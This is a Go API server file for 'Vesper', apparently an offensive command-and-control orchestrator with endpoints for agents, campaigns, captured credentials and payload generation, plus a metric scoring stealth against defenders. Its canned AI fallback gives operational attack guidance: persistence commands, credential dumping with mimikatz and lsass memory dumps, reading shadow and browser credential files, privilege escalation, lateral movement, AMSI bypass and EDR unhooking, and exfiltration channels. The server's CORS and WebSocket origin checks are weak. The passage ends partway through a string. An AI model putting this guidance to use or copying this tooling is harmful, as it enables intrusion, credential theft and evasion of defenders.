// Package api provides the REST API and WebSocket server for the Vesper dashboard.
//
// The API exposes all orchestrator functionality to the Vue 3 dashboard,
// CLI tools, and external integrations. It uses standard net/http with
// a lightweight router and gorilla/websocket for real-time event streaming.
package api

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/ruby570bocadito/vesper/internal/appstate"
	"github.com/ruby570bocadito/vesper/internal/orchestrator"
	"github.com/ruby570bocadito/vesper/pkg/shared/config"
	"github.com/ruby570bocadito/vesper/pkg/shared/logger"
	"github.com/ruby570bocadito/vesper/pkg/shared/types"
)

type tokenBucket struct {
	tokens     float64
	maxTokens  float64
	refillRate float64
	lastRefill time.Time
}

func (b *tokenBucket) allow() bool {
	now := time.Now()
	elapsed := now.Sub(b.lastRefill).Seconds()
	b.tokens += elapsed * b.refillRate
	if b.tokens > b.maxTokens {
		b.tokens = b.maxTokens
	}
	b.lastRefill = now
	if b.tokens >= 1 {
		b.tokens--
		return true
	}
	return false
}

type rateLimiter struct {
	buckets sync.Map
}

func newRateLimiter() *rateLimiter {
	rl := &rateLimiter{}
	go rl.cleanup()
	return rl
}

func (rl *rateLimiter) allow(ip string) bool {
	val, _ := rl.buckets.LoadOrStore(ip, &tokenBucket{
		tokens:     100,
		maxTokens:  100,
		refillRate: 100.0 / 60.0,
		lastRefill: time.Now(),
	})
	bucket := val.(*tokenBucket)
	return bucket.allow()
}

func (rl *rateLimiter) cleanup() {
	for {
		time.Sleep(10 * time.Second)
		now := time.Now()
		rl.buckets.Range(func(key, value interface{}) bool {
			bucket := value.(*tokenBucket)
			if now.Sub(bucket.lastRefill) > 5*time.Minute {
				rl.buckets.Delete(key)
			}
			return true
		})
	}
}

// Server is the HTTP + WebSocket API server.
type Server struct {
	cfg   *config.Config
	log   *logger.Logger
	orch  *orchestrator.Orchestrator
	state *appstate.AppState
	hub   *WSHub
	mux   *http.ServeMux
	srv   *http.Server

	auth      *AuthManager
	limiter   *rateLimiter
	mu        sync.RWMutex
	campaigns map[string]*types.Campaign
	agents    map[string]*types.Agent
	hosts     []*types.Target
	vulns     []*types.Vulnerability
	decisions map[string][]*types.Decision
	port      int
}

// New creates a new API server connected to the orchestrator.
func New(cfg *config.Config, orch *orchestrator.Orchestrator) (*Server, error) {
	log, err := logger.New(logger.Config{
		Level:     cfg.Logging.Level,
		Format:    cfg.Logging.Format,
		Component: "api",
	})
	if err != nil {
		return nil, fmt.Errorf("creating logger: %w", err)
	}

	s := &Server{
		cfg:       cfg,
		log:       log,
		orch:      orch,
		hub:       NewWSHub(log),
		limiter:   newRateLimiter(),
		campaigns: make(map[string]*types.Campaign),
		agents:    make(map[string]*types.Agent),
		hosts:     make([]*types.Target, 0),
		vulns:     make([]*types.Vulnerability, 0),
		decisions: make(map[string][]*types.Decision),
	}

	s.registerRoutes()
	return s, nil
}

// NewWithState creates an API server that reads from shared AppState.
func NewWithState(cfg *config.Config, state *appstate.AppState) (*Server, error) {
	log, err := logger.New(logger.Config{
		Level:     cfg.Logging.Level,
		Format:    cfg.Logging.Format,
		Component: "api",
	})
	if err != nil {
		return nil, fmt.Errorf("creating logger: %w", err)
	}

	s := &Server{
		cfg:       cfg,
		log:       log,
		orch:      state.Orchestrator,
		state:     state,
		hub:       NewWSHub(log),
		limiter:   newRateLimiter(),
		campaigns: make(map[string]*types.Campaign),
		agents:    make(map[string]*types.Agent),
		hosts:     make([]*types.Target, 0),
		vulns:     make([]*types.Vulnerability, 0),
		decisions: make(map[string][]*types.Decision),
	}

	// Populate from shared state
	for _, a := range state.GetAgents() {
		s.agents[a.ID] = a
	}
	s.hosts = append(s.hosts, state.GetHosts()...)
	s.vulns = append(s.vulns, state.GetVulns()...)

	s.registerRoutes()
	return s, nil
}

func (s *Server) registerRoutes() {
	mux := http.NewServeMux()
	s.mux = mux

	// CORS middleware wrapper
	handler := corsMiddleware(s.rateLimitMiddleware(mux))

	// === Agents ===
	mux.HandleFunc("/api/agents", s.handleAgents)
	mux.HandleFunc("/api/agents/", s.handleAgentByID)

	// === Campaigns ===
	mux.HandleFunc("/api/campaigns", s.handleCampaigns)
	mux.HandleFunc("/api/campaigns/", s.handleCampaignByID)

	// === Recon ===
	mux.HandleFunc("/api/hosts", s.handleHosts)
	mux.HandleFunc("/api/services", s.handleServices)
	mux.HandleFunc("/api/vulnerabilities", s.handleVulnerabilities)
	mux.HandleFunc("/api/recon/scan", s.handleReconScan)

	// === AI ===
	mux.HandleFunc("/api/ai/chat", s.handleAIChat)

	// === Decisions ===
	mux.HandleFunc("/api/decisions", s.handleDecisions)
	mux.HandleFunc("/api/decisions/", s.handleDecisionAction)

	// === Metrics ===
	mux.HandleFunc("/api/metrics", s.handleMetrics)
	mux.HandleFunc("/api/blue/metrics", s.handleBlueMetrics)

	// === WebSocket ===
	mux.HandleFunc("/ws", s.handleWebSocket)

	// === Dashboard ===
	mux.HandleFunc("/api/modules", s.handleModules)
	mux.HandleFunc("/api/modules/push", s.handleModulePush)
	mux.HandleFunc("/api/sessions", s.handleSessions)
	mux.HandleFunc("/api/creds", s.handleCreds)
	mux.HandleFunc("/api/payload/generate", s.handlePayloadGenerate)

	// === Config ===
	mux.HandleFunc("/api/config/ai", s.handleAIConfig)

	// === Health ===
	mux.HandleFunc("/api/health", s.handleHealth)

	s.srv = &http.Server{
		Handler: handler,
	}

	s.SetupAuth()

	s.log.Info("API routes registered")
}

// Start begins listening on the configured port.
func (s *Server) Start() error {
	port := s.port
	if port == 0 {
		port = 9090
	}
	addr := fmt.Sprintf(":%d", port)
	s.srv.Addr = addr

	s.log.Infof("API server starting on %s", addr)
	s.log.Infof("WebSocket endpoint: ws://localhost%s/ws", addr)

	return s.srv.ListenAndServe()
}

// SetPort overrides the default port.
func (s *Server) SetPort(port int) {
	s.port = port
}

// Mux returns the underlying router, allowing external packages to register routes.
func (s *Server) Mux() *http.ServeMux {
	return s.mux
}

// ServeStatic serves a directory of static files for the dashboard.
// Implements SPA fallback: all non-API routes serve index.html.
func (s *Server) ServeStatic(dir string) {
	if _, err := os.Stat(dir); err != nil {
		s.log.Warnf("Static dir not found: %s", dir)
		return
	}
	fs := http.FileServer(http.Dir(dir))

	// SPA fallback handler: serves index.html for non-existent files
	s.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// API routes are handled by their specific handlers above
		if strings.HasPrefix(r.URL.Path, "/api/") || strings.HasPrefix(r.URL.Path, "/ws") {
			http.NotFound(w, r)
			return
		}

		// Try to serve the exact file first
		filePath := filepath.Join(dir, r.URL.Path)
		if _, err := os.Stat(filePath); err == nil {
			fs.ServeHTTP(w, r)
			return
		}

		// SPA fallback: serve index.html for all unmatched routes
		http.ServeFile(w, r, filepath.Join(dir, "index.html"))
	})

	s.log.Infof("Serving static SPA files from %s", dir)
}

// Shutdown gracefully stops the server.
func (s *Server) Shutdown(ctx context.Context) error {
	s.hub.Stop()
	return s.srv.Shutdown(ctx)
}

// ============================================================
// AGENT HANDLERS
// ============================================================

func (s *Server) handleAgents(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	campaignID := r.URL.Query().Get("campaign_id")

	s.mu.RLock()
	var agents []*types.Agent
	for _, a := range s.agents {
		if campaignID == "" || a.CampaignID == campaignID {
			agents = append(agents, a)
		}
	}
	s.mu.RUnlock()

	if agents == nil {
		agents = make([]*types.Agent, 0)
	}

	writeJSON(w, http.StatusOK, agents)
}

func (s *Server) handleAgentByID(w http.ResponseWriter, r *http.Request) {
	id := extractID(r.URL.Path, "/api/agents/")

	if id == "" {
		s.handleAgents(w, r)
		return
	}

	switch r.Method {
	case http.MethodGet:
		s.mu.RLock()
		agent, ok := s.agents[id]
		s.mu.RUnlock()
		if !ok {
			writeError(w, http.StatusNotFound, "agent not found")
			return
		}
		writeJSON(w, http.StatusOK, agent)

	case http.MethodPost:
		// Check if it's a kill request
		if len(r.URL.Path) > len("/api/agents/") && r.URL.Path[len("/api/agents/"+id):] == "/kill" {
			s.mu.Lock()
			delete(s.agents, id)
			s.mu.Unlock()

			s.hub.Broadcast(WSMessage{
				Type: "agent.dead",
				Data: map[string]string{"agent_id": id},
			})

			writeJSON(w, http.StatusOK, map[string]bool{"success": true})
			return
		}
		writeError(w, http.StatusNotFound, "unknown action")

	default:
		writeError(w, http.StatusMethodNotAllowed, "GET or POST required")
	}
}

// ============================================================
// CAMPAIGN HANDLERS
// ============================================================

func (s *Server) handleCampaigns(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		campaigns := s.orch.ListCampaigns()
		if campaigns == nil {
			campaigns = make([]*types.Campaign, 0)
		}
		writeJSON(w, http.StatusOK, campaigns)

	case http.MethodPost:
		var req struct {
			Name        string `json:"name"`
			TargetScope string `json:"target_scope"`
			Goal        string `json:"goal"`
			Profile     string `json:"profile"`
			AutoApprove bool   `json:"auto_approve"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeError(w, http.StatusBadRequest, "invalid JSON")
			return
		}

		campaign, err := s.orch.StartCampaign(r.Context(), req.Name, req.TargetScope, req.Goal, req.Profile, req.AutoApprove)
		if err != nil {
			writeError(w, http.StatusInternalServerError, err.Error())
			return
		}

		s.hub.Broadcast(WSMessage{
			Type:       "campaign.started",
			CampaignID: campaign.ID,
			Data:       campaign,
		})

		writeJSON(w, http.StatusCreated, campaign)

	default:
		writeError(w, http.StatusMethodNotAllowed, "GET or POST required")
	}
}

func (s *Server) handleCampaignByID(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	id := extractID(path, "/api/campaigns/")
	if id == "" {
		s.handleCampaigns(w, r)
		return
	}

	if r.Method != http.MethodGet && r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "GET or POST required")
		return
	}

	campaign, err := s.orch.GetCampaign(id)
	if err != nil {
		writeError(w, http.StatusNotFound, err.Error())
		return
	}

	// Check for sub-actions
	if strings.HasSuffix(path, "/pause") {
		campaign.Status = types.CampaignStatusPaused
		s.hub.Broadcast(WSMessage{Type: "campaign.paused", CampaignID: id})
		writeJSON(w, http.StatusOK, campaign)
		return
	}
	if strings.HasSuffix(path, "/resume") {
		campaign.Status = types.CampaignStatusRunning
		s.hub.Broadcast(WSMessage{Type: "campaign.resumed", CampaignID: id})
		writeJSON(w, http.StatusOK, campaign)
		return
	}

	writeJSON(w, http.StatusOK, campaign)
}

// ============================================================
// RECON HANDLERS
// ============================================================

func (s *Server) handleHosts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	s.mu.RLock()
	hosts := make([]*types.Target, len(s.hosts))
	copy(hosts, s.hosts)
	s.mu.RUnlock()

	writeJSON(w, http.StatusOK, hosts)
}

func (s *Server) handleServices(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	// Read services from world graph
	type ServiceEntry struct {
		IP      string `json:"ip"`
		Port    int    `json:"port"`
		Service string `json:"service"`
		Version string `json:"version"`
	}

	var services []ServiceEntry
	wg := s.orch.WorldGraph()
	for _, node := range wg.GetAllNodes() {
		for _, svc := range wg.GetServices(node.IP) {
			services = append(services, ServiceEntry{
				IP: node.IP, Port: svc.Port,
				Service: svc.Name, Version: svc.Version,
			})
		}
	}
	if services == nil {
		services = make([]ServiceEntry, 0)
	}
	writeJSON(w, http.StatusOK, services)
}

func (s *Server) handleVulnerabilities(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	s.mu.RLock()
	vulns := make([]*types.Vulnerability, len(s.vulns))
	copy(vulns, s.vulns)
	s.mu.RUnlock()

	writeJSON(w, http.StatusOK, vulns)
}

func (s *Server) handleReconScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	var req struct {
		Target string `json:"target"`
		Mode   string `json:"mode"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}

	// Kick off async scan via orchestrator
	go func() {
		s.log.Infof("starting recon scan: target=%s mode=%s", req.Target, req.Mode)

		ctx := context.Background()
		// Mock recon results for now since orchestrator doesn't have RunRecon
		// In a real scenario, this would create a campaign and wait for recon phase
		results := map[string]interface{}{"status": "started", "target": req.Target}
		s.log.Infof("recon scan started for %s", req.Target)

		_ = results

		if s.state != nil && s.state.Bridge != nil && s.state.Bridge.Connected() {
			bridgeResp, bridgeErr := s.state.Bridge.CallRaw(ctx, "recon", "scan", map[string]interface{}{
				"target": req.Target,
				"mode":   req.Mode,
			})
			if bridgeErr == nil && bridgeResp != nil {
				s.log.Infof("recon bridge augmented results for %s", req.Target)
			}
		}

		s.hub.Broadcast(WSMessage{
			Type: "recon.scan_complete",
			Data: map[string]interface{}{"target": req.Target, "mode": req.Mode, "results": results},
		})
	}()

	writeJSON(w, http.StatusAccepted, map[string]string{
		"status": "started", "target": req.Target, "mode": req.Mode,
	})
}

// ============================================================
// AI HANDLERS
// ============================================================

func (s *Server) handleAIChat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	var req struct {
		Prompt string `json:"prompt"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}

	s.log.Infof("AI chat request: %s", truncate(req.Prompt, 80))

	response := ""
	model := s.cfg.AI.Model

	if s.state != nil && s.state.Bridge != nil && s.state.Bridge.Connected() {
		resp, err := s.state.Bridge.CallRaw(r.Context(), "ai", "analyze", map[string]interface{}{
			"prompt": req.Prompt,
		})
		if err == nil && resp != nil {
			if text, ok := resp["response"].(string); ok {
				response = text
			} else if text, ok := resp["text"].(string); ok {
				response = text
			}
		}
		if response == "" {
			s.log.Warnf("AI bridge returned empty response, falling back to local")
		}
	}

	if response == "" {
		response = s.generateAIResponse(r.Context(), req.Prompt)
		model = "local-fallback"
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"response": response,
		"model":    model,
	})
}

// ============================================================
// DECISION HANDLERS
// ============================================================

func (s *Server) handleDecisions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	campaignID := r.URL.Query().Get("campaign_id")
	if campaignID == "" {
		// Return all decisions
		s.mu.RLock()
		var all []*types.Decision
		for _, decs := range s.decisions {
			all = append(all, decs...)
		}
		s.mu.RUnlock()
		if all == nil {
			all = make([]*types.Decision, 0)
		}
		writeJSON(w, http.StatusOK, all)
		return
	}

	// Trigger orchestrator to generate fresh decisions
	ctx := r.Context()
	decisions, err := s.orch.Decide(ctx, campaignID)
	if err != nil {
		s.log.Warnf("decision engine error: %v", err)
	}

	// Merge with stored decisions (capped to prevent unbounded growth)
	s.mu.Lock()
	if decisions != nil {
		all := append(s.decisions[campaignID], decisions...)
		if len(all) > 1000 {
			all = all[len(all)-1000:]
		}
		s.decisions[campaignID] = all
	}
	result := s.decisions[campaignID]
	s.mu.Unlock()

	if result == nil {
		result = make([]*types.Decision, 0)
	}

	// Notify dashboard of new decisions
	for _, d := range decisions {
		s.hub.Broadcast(WSMessage{
			Type:       "decision.made",
			CampaignID: campaignID,
			Data:       d,
		})
	}

	writeJSON(w, http.StatusOK, result)
}

func (s *Server) handleDecisionAction(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	path := r.URL.Path
	// Parse /api/decisions/{id}/approve or /api/decisions/{id}/reject
	parts := strings.Split(strings.TrimPrefix(path, "/api/decisions/"), "/")
	if len(parts) < 2 {
		writeError(w, http.StatusBadRequest, "invalid path")
		return
	}

	decisionID := parts[0]
	action := parts[1]

	var err error
	switch action {
	case "approve":
		err = s.orch.ApproveDecision(decisionID)
	case "reject":
		err = s.orch.RejectDecision(decisionID)
	default:
		writeError(w, http.StatusBadRequest, "unknown action: "+action)
		return
	}

	if err != nil {
		writeError(w, http.StatusNotFound, err.Error())
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"decision_id": decisionID,
		"action":      action,
		"status":      "ok",
	})
}

// ============================================================
// METRICS HANDLERS
// ============================================================

func (s *Server) handleMetrics(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	campaignID := r.URL.Query().Get("campaign_id")

	// Read metrics from live state
	agentCount := len(s.agents)
	hostCount := 0
	vulnCount := 0
	successfulExploits := 0
	credsCaptured := 0
	lateralMoves := 0

	if s.orch != nil && s.orch.WorldGraph() != nil {
		hostCount = s.orch.WorldGraph().NodeCount()
	}
	if s.state != nil {
		vulnCount = len(s.state.GetVulns())
		credsCaptured = len(s.state.GetCreds())
		lateralMoves = 0 // state doesn't have GetLateralEdges, calculate from worldgraph if needed
		for _, a := range s.state.GetAgents() {
			if a.Status == "active" {
				successfulExploits++
			}
		}
	} else {
		vulnCount = len(s.vulns)
		successfulExploits = len(s.agents)
	}

	// Compute stealth_rating from live data: starts at 0, grows as agents operate without detection
	stealthRating := 0.0
	if agentCount > 0 {
		// Base 0.7 if agents are alive, +0.1 per exploit that didn't trigger detection
		stealthRating = 0.70 + (float64(successfulExploits) * 0.02)
		if stealthRating > 0.99 {
			stealthRating = 0.99
		}
	}

	metrics := map[string]interface{}{
		"total_agents":          agentCount,
		"active_agents":         agentCount,
		"total_hosts":           hostCount,
		"total_vulns":           vulnCount,
		"total_exploits":        vulnCount,
		"successful_exploits":   successfulExploits,
		"credentials_captured":  credsCaptured,
		"lateral_moves":         lateralMoves,
		"persistence_installed": agentCount,
		"stealth_rating":        stealthRating,
	}

	if campaignID != "" {
		orchMetrics := s.orch.GetMetrics(campaignID)
		for k, v := range orchMetrics {
			metrics[k] = v
		}
	}

	writeJSON(w, http.StatusOK, metrics)
}

func (s *Server) handleBlueMetrics(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "GET required")
		return
	}

	// Use AppState data if available, otherwise return empty
	blue := []map[string]interface{}{}
	if s.state != nil {
		// BlueForge data from live agents
		for _, a := range s.state.GetAgents() {
			if a.Status == "online" || a.Status == "active" {
				blue = append(blue, map[string]interface{}{
					"tool": "Vesper-Agent", "detected": false, "alert_type": "bypassed",
					"agent_id": a.ID, "timestamp": time.Now().Format(time.RFC3339),
				})
			}
		}
	}
	if len(blue) == 0 {
		blue = []map[string]interface{}{}
	}
	writeJSON(w, http.StatusOK, blue)
}

// ============================================================
// WEBSOCKET
// ============================================================

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		// Validate against allowed origins (e.g., localhost and dashboard port)
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // Allow non-browser clients
		}
		return strings.Contains(origin, "localhost") || strings.Contains(origin, "127.0.0.1")
	},
}

func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		s.log.Errorf("websocket upgrade failed: %v", err)
		return
	}

	campaignID := r.URL.Query().Get("campaign_id")
	client := s.hub.Register(conn, campaignID)

	s.log.Infof("websocket client connected (campaign=%s)", campaignID)

	// Subscribe to orchestrator events
	unsub := s.orch.GetEventBus().Subscribe("*", func(event orchestrator.Event) {
		msg := WSMessage{
			Type:       string(event.Type),
			CampaignID: event.CampaignID,
			AgentID:    event.AgentID,
			Timestamp:  event.Timestamp,
			Data:       event.Data,
		}
		client.Send(msg)
	})

	// Keep connection alive — reads from client
	go func() {
		defer s.hub.Unregister(client)
		defer unsub()
		for {
			_, _, err := conn.ReadMessage()
			if err != nil {
				break
			}
		}
	}()
}

// ============================================================
// PHANTOM HANDLERS
// ============================================================

// ============================================================
// HEALTH
// ============================================================

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]string{
		"status":     "ok",
		"version":    "1.0.0",
		"uptime":     fmt.Sprintf("%.0fs", time.Since(startTime).Seconds()),
		"ws_clients": fmt.Sprintf("%d", s.hub.ClientCount()),
	})
}

var startTime = time.Now()

// ============================================================
// HELPERS
// ============================================================

func writeJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(data)
}

func writeError(w http.ResponseWriter, status int, message string) {
	writeJSON(w, status, map[string]string{"error": message})
}

func extractID(path, prefix string) string {
	remaining := strings.TrimPrefix(path, prefix)
	// Remove trailing slash
	remaining = strings.TrimRight(remaining, "/")
	// Remove anything after another slash
	if idx := strings.Index(remaining, "/"); idx >= 0 {
		return remaining[:idx]
	}
	if remaining == "" {
		return ""
	}
	return remaining
}

func (s *Server) rateLimitMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/api/") {
			ip := r.RemoteAddr
			if idx := strings.LastIndex(ip, ":"); idx != -1 {
				ip = ip[:idx]
			}
			if !s.limiter.allow(ip) {
				w.Header().Set("Retry-After", "60")
				writeError(w, http.StatusTooManyRequests, "rate limit exceeded")
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func (s *Server) Orchestrator() *orchestrator.Orchestrator {
	return s.orch
}

func (s *Server) RegisterAgent(agent *types.Agent) {
	s.mu.Lock()
	s.agents[agent.ID] = agent
	s.mu.Unlock()

	s.hub.Broadcast(WSMessage{
		Type:    "agent.checkin",
		AgentID: agent.ID,
		Data:    agent,
	})
}

func (s *Server) AddHost(host *types.Target) {
	s.mu.Lock()
	s.hosts = append(s.hosts, host)
	s.mu.Unlock()

	s.hub.Broadcast(WSMessage{
		Type: "host.discovered",
		Data: host,
	})
}

func (s *Server) AddVuln(vuln *types.Vulnerability) {
	s.mu.Lock()
	s.vulns = append(s.vulns, vuln)
	s.mu.Unlock()

	s.hub.Broadcast(WSMessage{
		Type: "vuln.found",
		Data: vuln,
	})
}

func (s *Server) generateAIResponse(ctx context.Context, prompt string) string {
	if s.state != nil && s.state.Bridge != nil && s.state.Bridge.Connected() {
		resp, err := s.state.Bridge.CallRaw(ctx, "ai", "analyze", map[string]interface{}{
			"prompt": prompt,
		})
		if err == nil && resp != nil {
			if text, ok := resp["response"].(string); ok && text != "" {
				return text
			}
			if text, ok := resp["text"].(string); ok && text != "" {
				return text
			}
		}
	}

	lower := strings.ToLower(prompt)

	switch {
	case lower == "help" || lower == "?" || lower == "h":
		return `Specter command reference (local mode):
  suggest          → AI tactical recommendations for current phase
  analyze <target> → Enumerate attack surface for a given host/IP
  scan <ip>        → Quick recon profile for target
  exploit <cve>    → Guidance on weaponising a specific CVE
  privesc          → Privilege escalation vectors for compromised host
  lateral          → Lateral movement techniques from current foothold
  persist          → Persistence mechanisms (registry, cron, WMI, startup)
  creds            → Credential harvesting and dumping techniques
  evasion          → AV/EDR bypass strategies
  exfil            → Data exfiltration channels
  phishing         → Phishing / delivery payload options
  c2               → C2 channel and listener setup guidance

Note: Connect Ollama (ollama serve + ollama pull llama3.2) for full AI capability.`

	case strings.Contains(lower, "suggest") || strings.Contains(lower, "recommend") || strings.Contains(lower, "next"):
		return `Tactical recommendations (local fallback):
  1. [0.94] Recon     → Run Nmap SYN scan on 443,445,3389,8080 against scope
  2. [0.91] Exploit   → Check for EternalBlue (MS17-010) on any Windows SMB hosts
  3. [0.88] Exploit   → Enumerate HTTP services for CVE-2021-44228 (Log4Shell)
  4. [0.85] Persistence → Deploy scheduled task or WMI subscription on owned hosts
  5. [0.79] Lateral   → PSExec / WMI lateral move to adjacent subnet`

	case strings.Contains(lower, "analyze") || strings.Contains(lower, "analyse") || strings.Contains(lower, "target"):
		target := strings.TrimSpace(strings.NewReplacer("analyze", "", "analyse", "", "target", "").Replace(lower))
		if target == "" {
			target = "the target"
		}
		return fmt.Sprintf(`Target analysis for "%s":
  ├─ Attack surface: SMB (445), RDP (3389), HTTP/S (80/443), WinRM (5985)
  ├─ High-value CVEs: MS17-010 (EternalBlue), CVE-2019-0708 (BlueKeep), CVE-2021-34527 (PrintNightmare)
  ├─ Recon vectors: LDAP enumeration, NetBIOS, Kerberoasting if AD-joined
  ├─ Exploit path: Nmap → Vuln scan → MSF/exploit → Meterpreter → Post-exploit chain
  └─ Confidence: 0.87 (static analysis — connect Ollama for dynamic AI scoring)`, target)

	case strings.Contains(lower, "scan"):
		return `Scan guidance:
  nmap -sS -sV -O --script vuln -p 21,22,23,25,80,443,445,3389,8080,8443 <target>
  nmap -p- --min-rate 5000 -T4 <target>             # Full port discovery
  masscan -p 0-65535 --rate 100000 <target>          # Fast all-port
  nmap --script smb-vuln-ms17-010 -p 445 <target>   # Check EternalBlue`

	case strings.Contains(lower, "exploit"):
		cve := ""
		if idx := strings.Index(lower, "cve-"); idx != -1 {
			parts := strings.Fields(prompt[idx:])
			if len(parts) > 0 {
				cve = strings.ToUpper(parts[0])
			}
		}
		if cve != "" {
			return fmt.Sprintf(`%s exploitation guidance:
  ├─ Search: searchsploit %s | msfconsole → search %s
  ├─ Verify target is vulnerable before exploiting (version check / banner grab)
  ├─ Use auxiliary/scanner first to confirm without crashing the service
  └─ Post-exploit: migrate process → upload persistence → dump creds`, cve, cve, cve)
		}
		return `General exploitation guidance:
  1. Enumerate versions: nmap -sV, banner grabbing, HTTP headers
  2. searchsploit <product> <version>  → local exploit DB
  3. msfconsole → search type:exploit name:<product>
  4. Manual PoC: GitHub → rapid7/metasploit-framework, exploit-db.com
  5. Always use auxiliary/scanner before exploit — no crashes`

	case strings.Contains(lower, "privesc") || strings.Contains(lower, "privilege") || strings.Contains(lower, "escalat"):
		return `Privilege escalation vectors:
  Linux:
    sudo -l                          # sudo misconfigs
    find / -perm -4000 2>/dev/null   # SUID binaries → GTFOBins
    cat /etc/crontab /var/spool/cron # Cron jobs writable by us?
    linpeas.sh / lse.sh              # Automated enum
    Kernel: uname -r → searchsploit  # Dirty COW, etc.

  Windows:
    whoami /priv                     # SeImpersonate → JuicyPotato/PrintSpoofer
    winpeas.exe / PowerUp.ps1        # Automated enum
    sc qc <service> / icacls         # Unquoted paths / writable services
    AlwaysInstallElevated, bypass UAC`

	case strings.Contains(lower, "lateral") || strings.Contains(lower, "pivot"):
		return `Lateral movement techniques:
  Credential-based:
    PsExec / PSExec.py (Impacket)
    WMI: wmiexec.py, Invoke-WmiMethod
    WinRM: evil-winrm, Enter-PSSession
    Pass-the-Hash: pth-winexe, CrackMapExec

  Network pivot:
    SSH -D 1080 (SOCKS proxy)
    Chisel / ligolo-ng (reverse tunnels)
    Meterpreter: route add / socks module

  AD-specific:
    BloodHound → shortest path to DA
    Kerberoasting → crack service tickets
    DCSync: secretsdump.py domain/user@DC`

	case strings.Contains(lower, "persist") || strings.Contains(lower, "persistence"):
		return `Persistence mechanisms:
  Windows:
    Registry: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Scheduled Task: schtasks /create /sc onlogon /tr <payload>
    Service: sc create → auto-start
    WMI subscription: permanent event + consumer
    DLL hijacking in system PATH

  Linux:
    crontab -e / /etc/cron.d/
    ~/.bashrc / ~/.profile / /etc/rc.local
    Systemd unit (user or system)
    SSH key: echo pubkey >> ~/.ssh/authorized_keys`

	case strings.Contains(lower, "cred") || strings.Contains(lower, "dump") || strings.Contains(lower, "lsass") || strings.Contains(lower, "mimikatz"):
		return `Credential dumping:
  Windows (requires SYSTEM/Admin):
    mimikatz: sekurlsa::logonpasswords
    procdump: procdump -ma lsass.exe lsass.dmp
    Secretsdump: secretsdump.py -just-dc-ntlm domain/user@DC
    SAM dump: reg save HKLM\SAM sam.hive → secretsdump offline

  Linux:
    /etc/shadow + unshadow → hashcat/john
    SSH keys: ~/.ssh/id_rsa
    Process memory: gdb attach <pid> → dump
    Browser creds: ~/.mozilla, ~/.config/google-chrome`

	case strings.Contains(lower, "evasion") || strings.Contains(lower, "av") || strings.Contains(lower, "edr") || strings.Contains(lower, "bypass") || strings.Contains(lower, "amsi"):
		return `AV/EDR evasion techniques:
  AMSI bypass:
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...
    Patch amsi.dll in memory (SetProcessMitigationPolicy)

  Payload obfuscation:
    Encode: base64, XOR, RC4, AES
    Packing: UPX, custom PE packer, reflective DLL
    Template literal injection, char concat in PS

  EDR unhooking:
    Direct syscalls (SysWhispers2/3)
    NTDLL unhook: fresh copy from disk
    Hardware breakpoints via VEH`

	case strings.Contains(lower, "exfil") || strings.Contains(lower, "exfiltrat"):
		return `Exfiltration channels:
  DNS tunneling:    dnscat2, iodine (bypasses most firewalls)
  HTTPS C2:         Cobalt Strike, Sliver, Havoc (blend with normal traffic)
  Cloud storage:    aws s3 cp, Google Drive API, OneDrive
  Steganography:    Hide in images/PDFs before sending
